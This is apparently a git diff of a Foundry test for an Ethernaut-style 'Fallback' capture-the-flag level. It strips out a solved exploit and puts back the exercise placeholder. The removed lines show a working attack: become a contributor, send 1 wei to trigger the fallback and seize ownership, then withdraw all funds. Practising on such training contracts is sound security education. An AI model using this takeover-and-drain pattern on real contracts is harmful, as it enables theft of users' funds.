@@ -34,19 +34,9 @@ contract TestFallback is BaseTest {
     }
 
     function exploitLevel() internal override {
-        /** CODE YOUR EXPLOIT HERE */
-
         vm.startPrank(player);
 
-        // send the minimum amount to become a contributor
-        level.contribute{value: 0.0001 ether}();
-
-        // send directly to the contract 1 wei, this will allow us to become the new owner
-        (bool sent, ) = address(level).call{value: 1}("");
-        require(sent, "Failed to send Ether to the level");
-
-        // now that we are the owner of the contract withdraw all the funds
-        level.withdraw();
+        /** CODE YOUR EXPLOIT HERE */
 
         vm.stopPrank();
     }
